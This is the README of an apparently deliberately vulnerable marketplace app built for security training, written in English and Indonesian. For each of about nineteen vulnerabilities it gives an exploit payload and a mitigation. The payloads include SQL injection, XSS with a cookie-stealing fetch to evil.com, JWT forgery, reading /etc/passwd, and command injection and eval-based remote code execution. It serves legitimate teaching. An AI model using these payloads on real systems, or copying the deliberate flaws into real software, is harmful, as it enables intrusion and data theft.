# 🔐 IVM – ID-Networkers Vulnerability Map

> **⚠️ FOR SECURITY TRAINING / PENETRATION TESTING ONLY**
> Fokus: Memahami **apa yang salah (vulnerable)** dan **apa yang seharusnya benar (mitigasi)**.

---

## Architecture Overview

| Layer      | Technology           | Container          |
|------------|----------------------|--------------------|
| Frontend   | React 18 (Vite)      | `vuln-marketplace-ui` (nginx:alpine) |
| Backend    | Node.js 18 + Express | `vuln-marketplace-api` |
| Database   | MySQL 8.0            | `vuln-marketplace-db` |
| Cache      | Redis 7 (no auth)    | `vuln-marketplace-redis` |

---

## Vulnerability Matrix

### 1. SQL Injection

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/login`, `GET /api/search`, `POST /api/password-reset`, `GET /api/backup/:table` |
| **Type** | Authentication Bypass, Union-based, Error-based |
| **Root Cause** | String concatenation in SQL queries — no prepared statements |
| **Exploit** | `Username: ' OR '1'='1' -- -` bypasses authentication |
| **Impact** | Full authentication bypass, database data exfiltration |

**Apa yang salah:**
- Query dibangun dengan string concatenation: `` `SELECT * FROM users WHERE username='${username}'` ``
- Tidak menggunakan parameterized queries / prepared statements

**Cara mitigasi:**
- Gunakan prepared statements: `db.query('SELECT * FROM users WHERE username = ?', [username])`
- Gunakan ORM seperti Sequelize atau Prisma
- Validasi dan sanitize semua input

**Endpoint SQLi lainnya:**
- `GET /api/search?q=` — LIKE clause injection
- `GET /api/products/:id` — Numeric ID injection
- `POST /api/products` — name, description fields
- `POST /api/reviews` — comment field
- `POST /api/password-reset` — email field
- `GET /api/backup/:table` — table name injection

---

### 2. Reflected XSS

| Property | Value |
|----------|-------|
| **Endpoint** | `GET /api/search?q=<payload>` |
| **Frontend** | `Search.jsx` |
| **Root Cause** | Backend echoes raw `q` parameter; React renders it via `dangerouslySetInnerHTML` |
| **Exploit** | `/search?q=<img src=x onerror=alert(document.cookie)>` |
| **Impact** | Session hijacking, cookie theft, phishing |

**Apa yang salah:**
- Backend mengembalikan input user tanpa sanitasi
- Frontend menggunakan `dangerouslySetInnerHTML` untuk render output

**Cara mitigasi:**
- Sanitize output di backend (escape HTML entities)
- Jangan gunakan `dangerouslySetInnerHTML` — gunakan React text rendering biasa
- Implement Content Security Policy (CSP) headers

---

### 3. Stored XSS

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/reviews` (write) / `GET /api/reviews/:productId` (read) |
| **Root Cause** | Review comments stored as raw HTML; rendered via `dangerouslySetInnerHTML` |
| **Exploit** | Submit review: `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` |
| **Impact** | Persistent XSS affecting all users who view the product page |

**Apa yang salah:**
- Input review disimpan ke database tanpa sanitasi
- Saat ditampilkan, HTML dirender apa adanya tanpa escaping

**Cara mitigasi:**
- Sanitize input sebelum menyimpan ke database (gunakan library seperti DOMPurify)
- Escape HTML entities saat rendering
- Set `HttpOnly` dan `Secure` flag pada cookies

---

### 4. Broken Authentication

| Property | Value |
|----------|-------|
| **Location** | Database layer + JWT configuration |
| **Root Cause** | MD5 password hashing (no salt); JWT secret = `"secret123"`; JWT accepts `algorithm: "none"` |
| **Impact** | Account takeover, privilege escalation |

**Exploit 1 — JWT Algorithm None:**
```
# Decode JWT, ubah header ke {"alg":"none"}, ubah payload role ke "admin"
# Kirim tanpa signature
```

**Exploit 2 — Crack JWT Secret:**
```bash
# JWT secret hanya "secret123" — bisa di-crack dengan hashcat/john
hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
```

**Exploit 3 — Remember-Me Cookie Forgery:**
```bash
echo '{"id":1,"username":"admin","role":"admin"}' | base64
# Set cookie: remember_me=<base64_value>
```

**Apa yang salah:**
- MD5 tanpa salt mudah di-crack via rainbow table
- JWT secret terlalu lemah dan bisa di-bruteforce
- Menerima algorithm "none" — attacker bisa bypass signature verification
- Remember-me cookie hanya Base64 encode tanpa encryption/signing

**Cara mitigasi:**
- Gunakan bcrypt/argon2 untuk password hashing
- Gunakan JWT secret yang kuat (min 256-bit random)
- Whitelist algorithm di JWT verify: `algorithms: ['HS256']` saja
- Gunakan signed/encrypted cookies (e.g., `cookie-signature`)

---

### 5. IDOR / BOLA

| Property | Value |
|----------|-------|
| **Endpoint** | `GET /api/user/:id`, `GET /api/wallet/:userId`, `GET /api/users/export` |
| **Root Cause** | No authentication or ownership verification; predictable auto-increment IDs |
| **Exploit** | `curl http://localhost:3001/api/user/1` — exposes admin's email, address, phone, bio |
| **Impact** | PII disclosure for all users |

**Apa yang salah:**
- Tidak ada pengecekan apakah user yang request adalah pemilik data
- ID user bisa ditebak (auto-increment: 1, 2, 3, ...)
- `/api/users/export` tidak memerlukan authentication sama sekali

**Cara mitigasi:**
- Verifikasi bahwa `req.user.id === req.params.id`
- Gunakan UUID sebagai pengganti auto-increment ID
- Selalu require authentication dan authorization check

---

### 6. Mass Assignment

| Property | Value |
|----------|-------|
| **Endpoint** | `PUT /api/user/update` |
| **Root Cause** | Backend iterates over all fields from `req.body` including `role` |
| **Exploit** | `curl -X PUT /api/user/update -d '{"role":"admin"}'` |
| **Impact** | Privilege escalation from user → admin |

**Apa yang salah:**
- Backend menerima semua field dari request body tanpa whitelist
- Field `role` seharusnya tidak bisa diubah oleh user biasa

**Cara mitigasi:**
- Whitelist field yang boleh di-update: `const allowed = ['username', 'email', 'bio']`
- Gunakan DTO/schema validation (Joi, Zod)
- Pisahkan endpoint admin untuk mengubah role

---

### 7. Unrestricted File Upload

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/upload` |
| **Root Cause** | No file extension validation, no MIME check, no magic-byte verification |
| **Exploit** | Upload `.html` with JS, `.php` files, or webshells — served from `/uploads/` |
| **Impact** | Remote Code Execution, XSS via HTML upload |

**Apa yang salah:**
- Tidak ada validasi tipe file (extension, MIME type, magic bytes)
- File diupload ke directory yang publicly accessible
- Nama file asli dipertahankan (bisa overwrite file lain)

**Cara mitigasi:**
- Validasi extension (whitelist: `.jpg`, `.png`, `.gif`)
- Cek MIME type dan magic bytes
- Rename file ke random UUID
- Simpan di luar web root / gunakan CDN terpisah

---

### 8. Price Tampering

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/order` |
| **Root Cause** | `total_price` accepted from client request body; no server-side recalculation |
| **Exploit** | Intercept request, change `total_price` to `0.01` or `-100` |
| **Impact** | Purchase items for free or with negative prices |

**Apa yang salah:**
- Server mempercayai harga dari client tanpa verifikasi
- Tidak ada recalculation di server berdasarkan harga di database

**Cara mitigasi:**
- Hitung total harga di server berdasarkan product ID dan quantity
- Jangan pernah terima harga dari client-side
- Validasi bahwa harga > 0

---

### 9. Path Traversal / LFI

| Property | Value |
|----------|-------|
| **Endpoint** | `GET /api/admin/logs?f=<path>` |
| **Root Cause** | `f` parameter used in `fs.readFileSync()` with no path sanitisation |
| **Exploit** | `?f=../../../../etc/passwd` or `?f=/app/.env` |
| **Impact** | Read any file on the server filesystem (credentials, configs, source code) |

**Apa yang salah:**
- Path dari user langsung digunakan di `fs.readFileSync()` tanpa validasi
- Tidak ada pengecekan apakah path berada di directory yang diizinkan

**Cara mitigasi:**
- Gunakan `path.resolve()` dan pastikan hasilnya di dalam allowed directory
- Whitelist file yang boleh dibaca
- Gunakan `chroot` atau containerization

---

### 10. OS Command Injection

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/admin/ping` |
| **Root Cause** | `host` value passed directly to `child_process.exec()` |
| **Exploit** | `{"host": "127.0.0.1; cat /etc/passwd"}` or `{"host": "127.0.0.1 && whoami"}` |
| **Impact** | Full Remote Code Execution on the server |

**Apa yang salah:**
- Input user digabungkan langsung ke shell command
- Menggunakan `exec()` yang menjalankan command melalui shell

**Cara mitigasi:**
- Gunakan `execFile()` dengan array arguments (bukan shell)
- Validasi input dengan regex: `/^[\d.]+$/`
- Atau gunakan library net untuk ping (bukan shell command)

---

### 11. SSRF

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/export-pdf` |
| **Root Cause** | Server fetches arbitrary URL from `req.body.url` with no allow-list |
| **Exploit** | `{"url": "http://backend:3001/api/internal/metadata"}` atau `{"url": "http://backend:3001/api/config"}` |
| **Impact** | Access internal services, leak secrets, cloud metadata |

**Apa yang salah:**
- Server melakukan HTTP request ke URL yang diberikan user tanpa validasi
- Bisa mengakses service internal yang tidak seharusnya accessible dari luar

**Cara mitigasi:**
- Whitelist domain/IP yang boleh diakses
- Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x)
- Gunakan DNS resolution check sebelum request

---

### 12. Race Condition (Wallet Withdraw)

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/wallet/withdraw` |
| **Root Cause** | Read-then-update without transaction or row lock; 100ms artificial delay |
| **Exploit** | Send 20+ parallel withdraw requests |
| **Impact** | Withdraw more than available balance (balance protection in place but race still exists) |

**Apa yang salah:**
- Balance dicek (SELECT), lalu diupdate (UPDATE) tanpa database lock
- Ada gap waktu antara cek dan update dimana request lain bisa masuk

**Cara mitigasi:**
- Gunakan database transaction dengan `SELECT ... FOR UPDATE` (row locking)
- Gunakan atomic operation: `UPDATE wallets SET balance = balance - ? WHERE balance >= ?`
- Implement mutex/semaphore di application layer

---

### 12b. Race Condition (Discount Code Stacking)

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/discount/apply` |
| **Root Cause** | Check-then-insert without transaction; 500ms artificial delay between SELECT and INSERT |
| **Discount Code** | `IDN20` — 20% off (shown on Admin Dashboard) |
| **Exploit** | Send 5+ parallel requests to apply same discount code; all pass the "already used" check |
| **Impact** | Stack multiple 20% discounts (e.g., 5x = 100% off = free purchase) |

**Apa yang salah:**
- Server mengecek apakah kode diskon sudah dipakai (SELECT), lalu ada delay 500ms sebelum INSERT
- Dalam window 500ms itu, semua request paralel lolos pengecekan karena INSERT belum terjadi
- Setiap request yang berhasil menambah 20% diskon, bisa di-stack sampai 100%

**Exploit:**
```bash
# Kirim 5 request paralel — hasilnya 5x 20% = 100% discount
for i in $(seq 1 5); do
  curl -X POST http://localhost:3001/api/discount/apply \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"code":"IDN20","product_id":1}' &
done
wait
```

**Cara mitigasi:**
- Gunakan database transaction dengan `SELECT ... FOR UPDATE`
- Gunakan UNIQUE constraint pada `(user_id, discount_code, product_id)`
- Implement atomic check-and-insert: `INSERT ... WHERE NOT EXISTS (...)`
- Hilangkan delay, atau gunakan distributed lock (Redis)

---

### 13. RCE via eval()

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/debug` |
| **Root Cause** | User input passed directly to `eval()` |
| **Exploit** | `{"code": "require('child_process').execSync('id').toString()"}` |
| **Impact** | Full Remote Code Execution — arbitrary JavaScript on the server |

**Apa yang salah:**
- `eval()` mengeksekusi JavaScript arbitrary dari input user
- Debug endpoint tersedia di production

**Cara mitigasi:**
- JANGAN PERNAH gunakan `eval()` dengan user input
- Hapus debug/development endpoints di production
- Gunakan sandbox jika perlu eval (seperti vm2)

---

### 14. Server-Side Template Injection (SSTI)

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/feedback` |
| **Root Cause** | User input evaluated via template literal + `eval()` |
| **Exploit** | `{"name": "${require('child_process').execSync('whoami')}", "message": "test"}` |
| **Impact** | Remote Code Execution through template injection |

**Apa yang salah:**
- Template literal dibangun dari user input dan di-eval()
- Memungkinkan arbitrary code execution via template expressions

**Cara mitigasi:**
- Gunakan proper template engine (Handlebars, EJS) dengan auto-escaping
- Jangan gunakan eval() atau Function() dengan user input

---

### 15. Insecure Password Reset

| Property | Value |
|----------|-------|
| **Endpoint** | `POST /api/password-reset` |
| **Root Cause** | No email verification, no OTP, no rate limiting, SQL injection |
| **Exploit** | `{"username":"admin","new_password":"hacked"}` — directly resets any password |
| **Impact** | Account takeover for any user whose username is known |

**Apa yang salah:**
- Password direset tanpa verifikasi identitas (no OTP, no email confirmation)
- Siapa saja yang tahu username bisa mereset password user lain

**Cara mitigasi:**
- Kirim OTP/link reset ke email user
- Gunakan token sementara yang expire
- Implement rate limiting

---

### 16. Security Misconfiguration

| Property | Value |
|----------|-------|
| **Endpoints** | `GET /api/config`, `GET /api/health`, `GET /api/robots.txt` |
| **Root Cause** | Sensitive configuration exposed without authentication |

**Apa yang salah:**
- `/api/config` menampilkan semua secrets (JWT secret, DB password, API keys)
- `/api/health` menampilkan internal configuration
- `/api/robots.txt` mengekspos hidden endpoints
- CORS dikonfigurasi `origin: true` (allow all origins)
- Verbose error messages dikirim ke client

**Cara mitigasi:**
- Hapus/lindungi config endpoints
- Set `NODE_ENV=production` dan disable verbose errors
- Konfigurasi CORS dengan whitelist domain spesifik
- Jangan ekspos internal paths di robots.txt

---

### 17. Broken Access Control — User Data Export

| Property | Value |
|----------|-------|
| **Endpoint** | `GET /api/users/export`, `GET /api/backup/:table` |
| **Root Cause** | No authentication required; dumps all user data including passwords |

**Apa yang salah:**
- Endpoint mengembalikan semua user data (username, email, password hash) tanpa auth
- `/api/backup/:table` bisa dump tabel apapun tanpa authentication + rentan SQL injection

**Cara mitigasi:**
- Require admin authentication
- Jangan pernah expose password hashes
- Implement proper RBAC (Role-Based Access Control)

---

### 18. Client-Side Security Controls

| Property | Value |
|----------|-------|
| **Location** | Admin Dashboard (React components) |
| **Root Cause** | Admin panel hidden by React conditional rendering only; backend has no role check |
| **Exploit** | Any authenticated user can call `/api/admin/*` endpoints directly |

**Apa yang salah:**
- Akses admin hanya dikontrol di frontend (hide/show component)
- Backend tidak memvalidasi role user pada admin endpoints

**Cara mitigasi:**
- Implement middleware backend untuk cek role: `if (req.user.role !== 'admin') return 403`
- Client-side controls hanya untuk UX, bukan security

---

### 19. Open Redirect + Reflected XSS

| Property | Value |
|----------|-------|
| **Endpoint (Frontend)** | `/login?redirect=<url>` |
| **Endpoint (Backend)** | `GET /api/redirect?url=<url>` |
| **Root Cause** | No URL validation/whitelist; URL reflected in HTML without sanitisation |
| **Impact** | Phishing, credential theft, session hijacking via XSS |

**Exploit 1 — Open Redirect (Login):**
```
http://localhost/login?redirect=https://evil.com
→ Setelah login berhasil, user di-redirect ke evil.com
```

**Exploit 2 — Reflected XSS via redirect param (Login page):**
```
http://localhost/login?redirect=<img src=x onerror=alert(document.cookie)>
→ Payload dirender di halaman login via dangerouslySetInnerHTML
```

**Exploit 3 — XSS via javascript: URI (post-login):**
```
http://localhost/login?redirect=javascript:alert(document.cookie)
→ Setelah login, window.location.href = "javascript:..." → JS dieksekusi
```

**Exploit 4 — Backend Open Redirect:**
```bash
curl -v "http://localhost:3001/api/redirect?url=https://evil.com"
→ 302 redirect ke URL apapun
```

**Exploit 5 — Backend Reflected XSS (browser):**
```
http://localhost:3001/api/redirect?url="><script>alert(1)</script>
→ URL direfleksikan dalam HTML response tanpa escaping
```

**Apa yang salah:**
- Parameter `redirect` / `url` diterima tanpa validasi — bisa URL eksternal atau `javascript:`
- Frontend menggunakan `dangerouslySetInnerHTML` untuk menampilkan URL redirect
- Backend menggunakan string interpolation ke HTML tanpa encoding
- `window.location.href` menerima `javascript:` URI

**Cara mitigasi:**
- Whitelist hanya relative paths: validasi bahwa URL dimulai dengan `/` dan bukan `//`
- Jangan gunakan `dangerouslySetInnerHTML` — gunakan React text rendering biasa
- HTML-encode semua output di backend HTML responses
- Validasi URL scheme (hanya izinkan `http:` dan `https:`)

---

## Additional Weaknesses

| Weakness | Location | Description |
|----------|----------|-------------|
| Verbose Error Messages | All endpoints | SQL errors and stack traces returned to client |
| CORS Misconfiguration | `server.js` middleware | `origin: true` allows any origin with credentials |
| Token in localStorage | `AuthContext.jsx` | JWT stored in `localStorage` — accessible by XSS |
| No Rate Limiting | All endpoints | No brute-force protection on login |
| No CSRF Protection | All mutating endpoints | No CSRF tokens on any form |
| No Input Validation | All endpoints | No length, type, or format checks |
| Sensitive Data in Logs | `POST /api/login` | Full SQL query logged to console |
| No HTTPS | Docker setup | Everything runs over HTTP |
| Redis without Auth | `docker-compose.yml` | Redis exposed on port 6379 with no password |
| Insecure `NODE_ENV` | Backend container | Set to `development` — may enable debug features |

---

## Quick Start

```bash
cd /path/to/VCS
docker compose up --build

# Frontend: http://localhost
# Backend:  http://localhost:3001
# MySQL:    localhost:3306 (root/rootpassword)
# Redis:    localhost:6379 (no auth)
```
